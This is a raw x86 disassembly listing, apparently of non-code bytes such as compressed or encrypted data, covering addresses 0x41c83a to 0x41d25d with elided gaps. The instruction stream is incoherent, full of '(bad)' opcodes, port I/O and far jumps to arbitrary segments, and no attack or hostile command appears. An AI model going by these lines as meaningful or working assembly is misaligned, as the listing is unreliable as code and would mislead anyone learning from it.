  41c83a:	loop   0x41c84d
  41c83c:	push   ecx
  41c83d:	out    dx,al
  41c83e:	test   DWORD PTR [edx],0xb848b3c5
  41c844:	retf   
  41c845:	loope  0x41c84f
  41c847:	adc    DWORD PTR [ebp+0x2f],esp
  41c84a:	retf   0xb750
  41c84d:	stc    
  41c84e:	repnz dec edx
  41c850:	xor    BYTE PTR [ecx-0x642f311a],bl
  41c856:	mov    DWORD PTR [ebp+0x78],esi
  41c859:	es outs dx,DWORD PTR ss:[esi]
  41c85c:	pop    esp
  41c85d:	lods   eax,DWORD PTR ds:[esi]
  41c85e:	shr    BYTE PTR [ebp-0x5c],0xf
  41c862:	stos   DWORD PTR es:[edi],eax
  41c863:	sub    al,0xfc
  41c865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c866:	sub    DWORD PTR [edx],ecx
  41c868:	dec    ebx
  41c869:	repz sbb ch,bh
  41c86c:	push   edi
  41c86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c86e:	sub    ecx,DWORD PTR [esi]
  41c870:	mov    eax,0x8dd533c6
  41c875:	(bad)
  41c879:	int    0xf2
  41c87b:	test   DWORD PTR [edi+0x999ed08],edi
  41c881:	clc    
  41c882:	mov    eax,0x7c181103
  41c887:	mov    ebp,0x48a3a81
  41c88c:	hlt    
  41c88d:	and    cl,0x7e
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [ecx+0x5],esi
  41c902:	rol    edx,cl
  41c904:	dec    esp
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	rcr    esp,0xa9
  41c90f:	cdq    
  41c910:	sub    ah,BYTE PTR [edi]
  41c912:	jns    0x41c8fa
  41c914:	dec    esi
  41c915:	pop    eax
  41c916:	stc    
  41c917:	dec    esi
  41c918:	inc    esp
  41c919:	fstsw  WORD PTR [edx+0x32d465a2]
  41c920:	(bad)  
  41c921:	into   
  41c922:	dec    edx
  41c923:	push   edi
  41c924:	xchg   esi,eax
  41c925:	dec    edi
  41c927:	dec    ebx
  41c928:	and    dh,BYTE PTR ss:[edi+0x2cefd97]
  41c92f:	aaa    
  41c930:	mov    ch,0xcc
  41c932:	scas   al,BYTE PTR es:[edi]
  41c933:	lock scas al,BYTE PTR es:[edi]
  41c935:	inc    ecx
  41c936:	fwait
  41c937:	(bad)  
  41c938:	in     al,dx
  41c939:	fs out 0x3f,eax
  41c93c:	xor    ecx,edi
  41c93e:	icebp  
  41c93f:	in     al,dx
  41c940:	cld    
  41c941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c942:	dec    esp
  41c943:	mov    cl,BYTE PTR [ebx+0x6ee78cef]
  41c949:	dec    eax
  41c94a:	retf   0xe4f9
  41c94d:	cs mov dl,0xef
  41c950:	arpl   sp,si
  41c952:	cli    
  41c953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c954:	cmc    
  41c955:	mov    ecx,0xd99fb187
  41c95a:	or     DWORD PTR [ebx+0x27],ebp
  41c95d:	(bad)  
  41c95f:	mov    eax,ds:0xb4fc27c7
  41c964:	cmp    al,al
  41c966:	mov    ebx,0xa39230fe
  41c96b:	(bad)  
  41c96c:	fidivr DWORD PTR [ebx-0x131101fe]
  41c972:	les    edi,FWORD PTR [edi]
  41c974:	imul   ebx,DWORD PTR [ebx+eiz*8+0x50],0x46
  41c979:	outs   dx,DWORD PTR ds:[esi]
  41c97a:	pop    ebp
  41c97b:	sbb    al,0x47
  41c97d:	imul   DWORD PTR [ecx]
  41c97f:	std    
  41c980:	jmp    0xaee0:0x2229f9b2
  41c987:	add    DWORD PTR [edx-0x30d85a50],esp
  41c98d:	sub    BYTE PTR [eax],bl
  41c98f:	mov    al,0xea
  41c991:	adc    eax,0x279f1ec8
  41c996:	sbb    esi,DWORD PTR fs:[ebp+eax*1+0x2e1ab99d]
  41c99e:	fistp  WORD PTR [ebx]
  41c9a0:	(bad)  
  41c9a1:	test   ah,0x14
  41c9a4:	xor    eax,0xac4df614
  41c9a9:	xlat   BYTE PTR ds:[ebx]
  41c9aa:	fwait
  41c9ab:	fs ins BYTE PTR es:[edi],dx
  41c9ad:	stos   DWORD PTR es:[edi],eax
  41c9ae:	mov    esp,0xc97a65e4
  41c9b3:	popf   
  41c9b4:	inc    esp
  41c9b5:	cmp    al,0x34
  41c9b7:	addr16 pop ebx
  41c9b9:	loop   0x41c994
  41c9bb:	jl     0x41c95b
  41c9bd:	xor    bl,dl
  41c9bf:	fldln2 
  41c9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9c2:	test   DWORD PTR [ebx+0x67],ecx
  41c9c5:	mov    al,0x74
  41c9c7:	and    eax,0x5187feb9
  41c9cc:	icebp  
  41c9cd:	cld    
  41c9ce:	or     al,0x9b
  41c9d0:	sti    
  41c9d1:	dec    edx
  41c9d2:	mov    bl,0xff
  41c9d4:	xchg   ebp,eax
  41c9d5:	xor    DWORD PTR [ebx+0x49],esp
  41c9d8:	mov    eax,0xca80bff9
  41c9dd:	mov    edx,0x6306a03b
  41c9e2:	shl    DWORD PTR [edx],1
  41c9e4:	sub    ah,BYTE PTR [edi]
  41c9e6:	mov    ebp,0xeeefd09
  41c9eb:	imul   esp,DWORD PTR [ebx+0x11],0x5f
  41c9ef:	ds xor eax,0x22d3e321
  41c9f5:	add    al,0xb5
  41c9f7:	jecxz  0x41ca5a
  41c9f9:	mov    ds:0xea04d484,al
  41c9fe:	test   eax,0x872dbee4
  41ca03:	call   0x6c77:0xa3107941
  41ca0a:	sbb    BYTE PTR [edi+0x2f],bl
  41ca0d:	jle    0x41ca62
  41ca0f:	inc    esi
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	lods   eax,DWORD PTR ds:[esi]
  41ca81:	dec    ebx
  41ca82:	pusha  
  41ca83:	fst    DWORD PTR [eax+0x30]
  41ca86:	add    DWORD PTR [eax],eax
  41ca88:	add    al,0x1
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	jns    0x41ca9e
  41ca8e:	inc    edi
  41ca8f:	and    DWORD PTR [edx+0x68],eax
  41ca92:	in     al,dx
  41ca93:	xor    ebp,DWORD PTR [eax]
  41ca95:	pop    esp
  41ca96:	mov    esp,0xba2d2dc9
  41ca9b:	inc    edx
  41ca9c:	sti    
  41ca9d:	inc    ebp
  41ca9e:	inc    ebp
  41ca9f:	rol    esp,1
  41caa1:	rcr    DWORD PTR [esi],1
  41caa3:	test   esp,ecx
  41caa5:	add    ecx,DWORD PTR [edx+0x32]
  41caa8:	pop    es
  41caa9:	scas   al,BYTE PTR es:[edi]
  41caaa:	dec    ebx
  41caab:	in     al,dx
  41caac:	clc    
  41caad:	popa   
  41caae:	adc    bl,BYTE PTR [edx-0x71f435b3]
  41cab4:	mov    al,0x2b
  41cab6:	mov    dl,BYTE PTR [esi-0x18]
  41cab9:	jg     0x41ca4a
  41cabb:	jne    0x41cb34
  41cabd:	mov    esp,0x759eefc6
  41cac2:	adc    eax,0xc96828ad
  41cac7:	xchg   esi,eax
  41cac8:	or     ah,BYTE PTR [ebx]
  41caca:	bound  ecx,QWORD PTR [ebx-0x10650930]
  41cad0:	jle    0x41cb44
  41cad2:	fcmovnb st,st(7)
  41cad4:	sbb    eax,0xa20ddea7
  41cad9:	pop    ss
  41cada:	jae    0x41cabd
  41cadc:	aas    
  41cadd:	in     al,0x5d
  41cadf:	pop    ss
  41cae0:	aaa    
  41cae1:	call   0xd55f:0x5945b9bb
  41cae8:	add    eax,0x44230580
  41caed:	in     al,dx
  41caee:	mov    edx,0xd0622c00
  41caf3:	inc    esp
  41caf4:	cmp    al,0x34
  41caf6:	push   0xf5dc1595
  41cafb:	(bad)  
  41cafc:	sbb    cx,WORD PTR [ecx]
  41caff:	sbb    DWORD PTR [edi-0x328d252d],ecx
  41cb05:	sbb    esi,DWORD PTR [ebx-0x726cf269]
  41cb0b:	test   eax,0xb96433de
  41cb10:	mov    bh,0xf
  41cb12:	fisttp DWORD PTR [eax+0x5e5a95da]
  41cb18:	retf   
  41cb19:	add    BYTE PTR [edx-0x30],dl
  41cb1c:	xor    eax,0x96ce4b29
  41cb21:	sahf   
  41cb22:	pop    ebx
  41cb23:	jmp    0x63c3:0xfe4b08ef
  41cb2a:	xchg   esp,eax
  41cb2b:	dec    edi
  41cb2c:	fiadd  WORD PTR [edi-0x3ffe7638]
  41cb32:	cmp    eax,0xaf74ea38
  41cb37:	xchg   esp,esp
  41cb39:	aad    0x82
  41cb3b:	sbb    DWORD PTR [ecx],ebp
  41cb3d:	lahf   
  41cb3e:	stc    
  41cb3f:	les    ebp,FWORD PTR [esp+esi*1-0x79]
  41cb43:	outs   dx,BYTE PTR ds:[esi]
  41cb44:	push   edi
  41cb45:	dec    ebp
  41cb46:	out    dx,eax
  41cb47:	scas   eax,DWORD PTR es:[edi]
  41cb48:	imul   eax,DWORD PTR [edx+0x38279cba],0x64d0ca8d
  41cb52:	add    al,BYTE PTR [edx-0x73]
  41cb55:	mov    ch,bl
  41cb57:	(bad)  
  41cb58:	dec    ebp
  41cb59:	jecxz  0x41cbaa
  41cb5b:	icebp  
  41cb5c:	or     eax,0xa41df3d8
  41cb61:	jnp    0x41cb5a
  41cb63:	mov    ecx,0x5f9a7705
  41cb68:	ss push ebp
  41cb6a:	or     al,0xa
  41cb6c:	pop    ebp
  41cb6d:	cdq    
  41cb6e:	dec    ebp
  41cb6f:	out    0x3d,al
  41cb71:	inc    ebx
  41cb72:	sub    ebp,DWORD PTR [eiz*1-0x6e1bc95f]
  41cb79:	jae    0x41cbe5
  41cb7b:	jmp    0x41cbd1
  41cb7d:	mov    ah,0x9e
  41cb7f:	ret    
  41cb80:	(bad)  
  41cb81:	fs cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  41cb84:	pop    ebx
  41cb85:	arpl   dx,bx
  41cb87:	arpl   WORD PTR [edi+0x2489795d],di
  41cb8d:	jle    0x41cb2b
  41cb8f:	mov    dh,0x0
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xf462eb22
  41cc03:	adc    al,0x54
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	les    edx,FWORD PTR fs:[esp+ebx*8]
  41cc10:	inc    edi
  41cc11:	sub    al,0x3d
  41cc13:	in     eax,0xc7
  41cc15:	pop    ds
  41cc16:	dec    edi
  41cc17:	cs dec ecx
  41cc19:	pop    ebp
  41cc1a:	ins    BYTE PTR es:[edi],dx
  41cc1b:	stos   DWORD PTR es:[edi],eax
  41cc1c:	dec    ecx
  41cc1d:	jl     0x41cc02
  41cc1f:	cdq    
  41cc20:	clc    
  41cc21:	cmp    DWORD PTR [ecx],0x16af82b7
  41cc27:	repnz cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41cc2a:	loope  0x41cc53
  41cc2c:	iret   
  41cc2d:	xchg   DWORD PTR [ebx],ebp
  41cc2f:	retf   
  41cc30:	retf   
  41cc31:	loope  0x41cbed
  41cc33:	sub    ch,BYTE PTR [edi]
  41cc35:	test   al,0x29
  41cc37:	dec    esi
  41cc38:	ds dec edi
  41cc3a:	dec    edx
  41cc3b:	addr16 out 0x2f,al
  41cc3e:	dec    ebx
  41cc3f:	vsubps ymm5,ymm0,YMMWORD PTR [eax]
  41cc43:	adc    al,0x50
  41cc45:	add    BYTE PTR [esi-0x53],bh
  41cc48:	arpl   WORD PTR [edi],ax
  41cc4a:	pop    esi
  41cc4b:	mov    ?,WORD PTR [edi-0x53]
  41cc4e:	in     eax,dx
  41cc4f:	fnsave [edx+eiz*4+0x21]
  41cc53:	mov    cl,0x70
  41cc55:	adc    edx,DWORD PTR [ecx-0x7781a943]
  41cc5b:	xor    esi,DWORD PTR [edi+ecx*4+0x59fe512e]
  41cc62:	(bad)  
  41cc63:	in     eax,dx
  41cc64:	adc    ah,ah
  41cc66:	clc    
  41cc67:	push   edi
  41cc68:	pop    ecx
  41cc69:	and    ecx,DWORD PTR [edi-0x18fc25db]
  41cc6f:	push   0x41945edb
  41cc74:	ja     0x41cc3f
  41cc76:	fstp   st(6)
  41cc78:	jno    0x41cc7b
  41cc7a:	jmp    0x197d:0xf4c5a609
  41cc81:	(bad)  
  41cc82:	mov    edx,0xd79eb2dd
  41cc87:	inc    ebp
  41cc88:	add    DWORD PTR [ebx],0xffffff9a
  41cc8b:	sbb    eax,0x967110aa
  41cc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc91:	mov    DWORD PTR [ecx],edi
  41cc93:	out    dx,eax
  41cc94:	sbb    al,0xfd
  41cc96:	or     ebx,eax
  41cc98:	aam    0x1d
  41cc9a:	cmp    DWORD PTR [ebp-0x24],ebp
  41cc9d:	or     al,0x65
  41cc9f:	mov    ebp,0xf0f66d1f
  41cca4:	xchg   edx,eax
  41cca5:	dec    edi
  41cca6:	and    DWORD PTR [ecx+0x175a718c],edx
  41ccac:	mov    eax,0x57ff584c
  41ccb1:	imul   BYTE PTR [ecx-0x23]
  41ccb4:	loopne 0x41cd22
  41ccb6:	and    dl,BYTE PTR [edi+0x17]
  41ccb9:	inc    ecx
  41ccba:	cmp    al,0xc0
  41ccbc:	dec    edx
  41ccbd:	lods   al,BYTE PTR ds:[esi]
  41ccbe:	sub    bh,BYTE PTR [esi-0x3f7cb221]
  41ccc4:	inc    edi
  41ccc5:	sub    ah,BYTE PTR [eax+esi*1]
  41ccc8:	fild   DWORD PTR [edi-0x5a]
  41cccb:	repz cdq 
  41cccd:	fwait
  41ccce:	out    dx,al
  41cccf:	int3   
  41ccd0:	call   0xa752d495
  41ccd5:	hlt    
  41ccd6:	xor    BYTE PTR [ecx],cl
  41ccd8:	fidivr WORD PTR [ebp+0x66c150de]
  41ccde:	xor    esp,ecx
  41cce0:	dec    ebp
  41cce1:	fcmovne st,st(7)
  41cce3:	xor    BYTE PTR [ecx],0x32
  41cce6:	jge    0x41cd0e
  41cce8:	test   DWORD PTR [eax],esp
  41ccea:	popa   
  41cceb:	pop    ecx
  41ccec:	ins    BYTE PTR es:[edi],dx
  41cced:	(bad)  
  41ccee:	jb     0x41cd52
  41ccf0:	push   esi
  41ccf1:	mov    eax,ds:0xa771741d
  41ccf6:	cmp    eax,0xe1bfe387
  41ccfb:	xor    eax,0x893618ca
  41cd00:	icebp  
  41cd01:	pop    es
  41cd02:	add    edi,DWORD PTR [ecx+0x63]
  41cd05:	fiadd  DWORD PTR [edi-0xd699a6]
  41cd0b:	or     al,0xdd
  41cd0d:	daa    
  41cd0e:	adc    ch,cl
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	dec    ecx
  41cd81:	mov    al,0xe4
  41cd83:	das    
  41cd84:	pop    eax
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	dec    ebp
  41cd8d:	pop    esi
  41cd8e:	or     eax,0x2b8ca132
  41cd93:	out    dx,al
  41cd94:	in     al,dx
  41cd95:	add    DWORD PTR [edx-0x29d6ba95],edi
  41cd9b:	and    edi,esp
  41cd9d:	or     eax,0x766ab92c
  41cda2:	adc    DWORD PTR [esi+edx*4-0x64],edx
  41cda6:	pop    ss
  41cda7:	mov    ecx,0x9d7550b
  41cdac:	sub    eax,0x3dc52dad
  41cdb1:	and    BYTE PTR ds:[ebp*4-0x5acf7d45],bh
  41cdb9:	ins    BYTE PTR es:[edi],dx
  41cdba:	stos   BYTE PTR es:[edi],al
  41cdbb:	or     eax,0x2bc937a9
  41cdc0:	sbb    eax,0x8e158e6c
  41cdc5:	std    
  41cdc6:	pop    ecx
  41cdc7:	cmp    ch,BYTE PTR [esi-0x2a]
  41cdca:	repz repnz popa 
  41cdcd:	ins    DWORD PTR es:[edi],dx
  41cdce:	in     al,dx
  41cdcf:	gs enter 0x57c1,0x28
  41cdd4:	and    al,0x2e
  41cdd6:	es addr16 xor al,0xe0
  41cdda:	das    
  41cddb:	push   0xffffffd8
  41cddd:	cmp    cl,BYTE PTR [ebp+0x1ec186f8]
  41cde3:	mov    bh,0xe6
  41cde5:	int3   
  41cde6:	pop    edx
  41cde7:	addr16 cmp bl,dl
  41cdea:	retf   0x45b5
  41cded:	push   ss
  41cdee:	imul   esp,DWORD PTR [ebp-0x3b],0xffffffe4
  41cdf2:	loope  0x41cdc0
  41cdf4:	cmp    DWORD PTR [ecx],eax
  41cdf6:	(bad)  
  41cdf7:	jmp    0x34493921
  41cdfc:	add    eax,0xda50f6fb
  41ce01:	mov    bl,0xab
  41ce03:	mov    eax,0x29cef4a1
  41ce08:	mov    ebp,0x1909e739
  41ce0d:	in     al,dx
  41ce0e:	cmp    ebp,ebp
  41ce10:	mov    ecx,0x86a976ca
  41ce15:	mov    edx,0x20ad5ace
  41ce1a:	repnz push eax
  41ce1c:	cmp    BYTE PTR [ebp-0x2b],bh
  41ce1f:	push   ds
  41ce20:	mov    BYTE PTR [esi],dl
  41ce22:	test   BYTE PTR [eax+0x64],ch
  41ce25:	test   eax,0x333776c5
  41ce2a:	out    0xcd,al
  41ce2c:	or     DWORD PTR [eax+0x5c],esp
  41ce2f:	aaa    
  41ce30:	dec    edx
  41ce31:	test   al,0xa
  41ce34:	out    0x5c,eax
  41ce36:	pop    esp
  41ce37:	mov    BYTE PTR [esi-0x4d068ded],dh
  41ce3d:	cmp    edx,ebp
  41ce3f:	pop    esi
  41ce40:	das    
  41ce41:	hlt    
  41ce42:	jp     0x41cdf3
  41ce44:	push   es
  41ce45:	(bad)  
  41ce46:	jge    0x41ce36
  41ce48:	pop    eax
  41ce49:	jmp    esp
  41ce4b:	outs   dx,DWORD PTR ds:[esi]
  41ce4c:	js     0x41ceac
  41ce4e:	dec    ebx
  41ce4f:	or     esi,DWORD PTR [ebx+0x46440356]
  41ce55:	test   al,0xc6
  41ce57:	or     DWORD PTR [edi-0x31],ebx
  41ce5a:	movq   mm3,QWORD PTR [ebx*1-0x2933da7c]
  41ce62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce63:	cmp    BYTE PTR [edi],al
  41ce65:	jns    0x41ceac
  41ce67:	gs mov edx,0x6398858f
  41ce6d:	in     al,dx
  41ce6e:	std    
  41ce6f:	sbb    BYTE PTR [eax],dh
  41ce71:	or     ah,BYTE PTR [ebp+esi*8+0x21]
  41ce75:	add    ebp,DWORD PTR [ecx+0x7868282b]
  41ce7b:	imul   ecx,eax,0x52fe5823
  41ce81:	das    
  41ce82:	out    dx,eax
  41ce83:	cld    
  41ce84:	mov    al,0x42
  41ce86:	adc    ch,BYTE PTR [edx-0xc]
  41ce89:	sar    DWORD PTR ds:0xe6b681d9,0x9
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	xor    al,0xcc
  41cf02:	fldenv [ebp+0x5c]
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	fcomp  QWORD PTR [eax-0x668ed27c]
  41cf12:	dec    edi
  41cf13:	push   esp
  41cf14:	mov    cl,0x1d
  41cf16:	mov    WORD PTR [edx-0x30],gs
  41cf19:	mov    dl,dl
  41cf1b:	ins    BYTE PTR es:[edi],dx
  41cf1c:	mov    eax,ds:0xc3b7d6be
  41cf21:	jae    0x41cf97
  41cf23:	push   ebx
  41cf24:	add    edx,0xc94ec3a0
  41cf2a:	das    
  41cf2b:	and    BYTE PTR [edi],dh
  41cf2d:	sbb    BYTE PTR [ebx+0x45605ceb],ch
  41cf33:	imul   esi,DWORD PTR [edi+0xa],0xef95bb41
  41cf3a:	cmp    eax,0x5df8dcb9
  41cf3f:	das    
  41cf40:	pushf  
  41cf41:	sub    eax,0x234875a4
  41cf46:	jne    0x41cf96
  41cf48:	je     0x41cf8e
  41cf4a:	in     eax,dx
  41cf4b:	loop   0x41cef4
  41cf4d:	jl     0x41cf3e
  41cf4f:	not    ebx
  41cf51:	retf   
  41cf52:	mov    cl,0x31
  41cf54:	adc    al,ch
  41cf56:	jle    0x41cf36
  41cf58:	fwait
  41cf59:	int3   
  41cf5a:	sub    al,0xe1
  41cf5c:	sbb    al,BYTE PTR [ecx-0xff1ef0c]
  41cf62:	bound  ebp,QWORD PTR [ebx-0x5d2a56f]
  41cf68:	and    eax,DWORD PTR [esp+eiz*4-0x1e32fb7c]
  41cf6f:	xchg   edx,eax
  41cf70:	lock sub al,0x2c
  41cf73:	popa   
  41cf74:	fbstp  TBYTE PTR [edx]
  41cf76:	mov    ecx,0x8edd31e4
  41cf7b:	pop    esi
  41cf7c:	xchg   ebp,eax
  41cf7d:	hlt    
  41cf7e:	jge    0x41cfc0
  41cf80:	jae    0x41cf83
  41cf82:	aad    0x32
  41cf84:	fdivp  st(3),st
  41cf86:	sub    eax,0xe389df4
  41cf8b:	(bad)  
  41cf8d:	pop    es
  41cf8e:	out    dx,al
  41cf8f:	fbstp  TBYTE PTR [ecx-0x7102dc80]
  41cf95:	adc    al,0x4
  41cf97:	cmp    eax,0xce7c5d5f
  41cf9c:	mov    edi,0xa6ed6ff5
  41cfa1:	lods   al,BYTE PTR ds:[esi]
  41cfa2:	(bad)  
  41cfa3:	js     0x41cfe3
  41cfa5:	aam    0xb9
  41cfa7:	fmulp  st(3),st
  41cfa9:	fiadd  WORD PTR [ebx+ebx*1+0x1b]
  41cfad:	cmp    BYTE PTR [ebp-0x73],dl
  41cfb0:	adc    al,0xb9
  41cfb2:	in     eax,0xd1
  41cfb4:	jp     0x41cfdb
  41cfb6:	jnp    0x41cf69
  41cfb8:	stos   DWORD PTR es:[edi],eax
  41cfb9:	xor    al,bl
  41cfbb:	cmp    al,0xeb
  41cfbd:	mov    esi,0x354b8200
  41cfc2:	sahf   
  41cfc3:	dec    edi
  41cfc4:	rcr    DWORD PTR [edx],cl
  41cfc6:	lahf   
  41cfc7:	loopne 0x41d015
  41cfc9:	mov    edi,DWORD PTR [ecx+esi*2]
  41cfcc:	jmp    0x41cf55
  41cfce:	dec    edi
  41cfcf:	cwde   
  41cfd0:	ins    BYTE PTR es:[edi],dx
  41cfd1:	repz inc ebp
  41cfd3:	hlt    
  41cfd4:	mov    eax,ds:0x4fed9d6c
  41cfd9:	sub    DWORD PTR [eax],edx
  41cfdb:	scas   eax,DWORD PTR es:[edi]
  41cfdc:	fidiv  DWORD PTR [edx+0x7fbd213f]
  41cfe2:	fucomi st,st(7)
  41cfe4:	mov    es,WORD PTR [esi]
  41cfe6:	ja     0x41d02c
  41cfe8:	xchg   esi,eax
  41cfe9:	and    DWORD PTR [eax+0x9b3f145],ebp
  41cfef:	xor    eax,0xd94e16ca
  41cff4:	shl    DWORD PTR [eax+0x401e4c9d],cl
  41cffa:	jae    0x41d01a
  41cffc:	shl    bh,cl
  41cffe:	das    
  41cfff:	jle    0x41cf87
  41d001:	jle    0x41cfb3
  41d003:	arpl   bp,cx
  41d005:	cmp    eax,0x91d38bc1
  41d00a:	jns    0x41d014
  41d00c:	out    dx,al
  41d00d:	ucomiss xmm4,DWORD PTR [ecx+0x0]
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xb535f3bd
  41d083:	push   ebp
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	jg     0x41d0e3
  41d08e:	inc    esi
  41d08f:	mov    bl,0x80
  41d091:	and    ebp,DWORD PTR [esi+0x6d]
  41d094:	out    dx,al
  41d095:	push   ecx
  41d096:	int3   
  41d097:	enter  0x8db6,0xa3
  41d09b:	outs   dx,DWORD PTR ds:[esi]
  41d09c:	call   0xc206:0xeb888d24
  41d0a3:	ja     0x41d0d2
  41d0a5:	imul   BYTE PTR [ebp+ebx*1+0x6fd9245b]
  41d0ac:	sbb    DWORD PTR [ebx+0x0],edi
  41d0af:	or     DWORD PTR [edi+0x61c72be4],ebp
  41d0b5:	mov    al,ds:0x192d159e
  41d0ba:	popf   
  41d0bb:	pop    esi
  41d0bc:	mov    esp,0x88e863f6
  41d0c1:	and    bh,ch
  41d0c3:	mov    ds:0x9b9fbd60,al
  41d0c8:	imul   ecx,DWORD PTR [esi+ebp*8],0xfffffffb
  41d0cc:	dec    ecx
  41d0cd:	(bad)  
  41d0ce:	retf   
  41d0cf:	mov    bh,0xcc
  41d0d1:	mov    bh,0x5a
  41d0d3:	out    0xc1,eax
  41d0d5:	dec    edi
  41d0d6:	dec    esp
  41d0d7:	mov    ch,BYTE PTR [ecx-0x7071b04d]
  41d0dd:	ficomp WORD PTR [edi+edi*8+0xa000035]
  41d0e4:	test   BYTE PTR [ecx-0xb5fc0a1],0xb
  41d0eb:	sbb    eax,0x20b0fcb5
  41d0f0:	push   eax
  41d0f1:	repnz in eax,dx
  41d0f3:	adc    esp,ebp
  41d0f5:	(bad)  
  41d0f6:	arpl   sp,cx
  41d0f8:	mov    cl,0x5c
  41d0fa:	imul   ebp,DWORD PTR [ebx+0xd],0x5d
  41d0fe:	sti    
  41d0ff:	inc    ecx
  41d100:	fs je  0x41d104
  41d103:	sbb    al,0x90
  41d105:	jge    0x41d099
  41d107:	popa   
  41d108:	es inc esi
  41d10a:	and    dh,BYTE PTR [eax]
  41d10c:	lock dec bp
  41d10f:	inc    ecx
  41d110:	cmp    al,0x17
  41d112:	jnp    0x41d0e0
  41d114:	in     al,dx
  41d115:	xor    DWORD PTR [eax-0x6e],esp
  41d118:	pusha  
  41d119:	xchg   BYTE PTR [edx-0x27],ch
  41d11c:	jne    0x41d0ce
  41d11e:	mov    ds:0x11242a93,eax
  41d123:	aad    0xd6
  41d125:	mov    edi,0x4e0c67e3
  41d12a:	cmp    esi,DWORD PTR [ebx+0x76a0cc93]
  41d130:	imul   ebp,DWORD PTR [ebx+0x60a6884a],0x51ab2681
  41d13a:	test   eax,0x48bb1ec6
  41d13f:	or     al,BYTE PTR [esp+eax*4]
  41d142:	add    edi,DWORD PTR [esi-0x43193009]
  41d148:	fmul   QWORD PTR ds:0xc996286d
  41d14e:	dec    ebp
  41d14f:	ret    
  41d150:	or     DWORD PTR [edi+eax*4],0x9a77f1a5
  41d157:	enter  0xf534,0x97
  41d15b:	aaa    
  41d15c:	sbb    eax,0x4e34ea9
  41d161:	pushf  
  41d162:	pop    ecx
  41d163:	inc    ebx
  41d164:	gs mov ebx,0x34a81f41
  41d16a:	add    al,0x3b
  41d16c:	stos   DWORD PTR es:[edi],eax
  41d16d:	xchg   BYTE PTR [ebp-0x1eb7d4d0],ah
  41d173:	adc    bh,BYTE PTR [edx+0x1d]
  41d176:	adc    dh,ch
  41d178:	sti    
  41d179:	imul   eax,edi,0xb19df744
  41d17f:	arpl   dx,di
  41d181:	push   edi
  41d182:	mov    DWORD PTR [edi],ebp
  41d184:	push   esi
  41d185:	(bad)  
  41d186:	fldcw  WORD PTR [eax-0x14869c08]
  41d18c:	aaa    
  41d18d:	lahf   
  41d18e:	inc    ecx
  41d18f:	data16 add BYTE PTR [eax],al
	...
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	inc    esi
  41d201:	retf   
  41d202:	fadd   st,st(0)
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	imul   eax,DWORD PTR [edi-0x6ca83687],0x9939589f
  41d216:	add    BYTE PTR [eax+0x170682ab],al
  41d21c:	shl    BYTE PTR [edx],0x2f
  41d21f:	clc    
  41d220:	add    bl,cl
  41d222:	test   BYTE PTR [ebx+ebx*4-0x19],cl
  41d226:	(bad)  
  41d227:	jmp    0xcce8fe3b
  41d22c:	aas    
  41d22d:	sub    DWORD PTR [ebp-0x86e03f5],edx
  41d233:	sar    DWORD PTR [edx],0x61
  41d236:	std    
  41d237:	(bad)  
  41d238:	mov    ecx,0x75f87a20
  41d23d:	add    eax,0xef42647f
  41d242:	mov    ds:0xf02ff103,al
  41d247:	mov    edi,0x1b10efc4
  41d24c:	mov    ds:0x240a41f2,al
  41d251:	sbb    BYTE PTR [ecx+0x79],0x9a
  41d255:	push   eax
  41d256:	out    0x62,al
  41d258:	mov    al,BYTE PTR [edx]
  41d25a:	loop   0x41d212
  41d25c:	push   ecx
  41d25d:	lods   al,BYTE PTR ds:[esi]
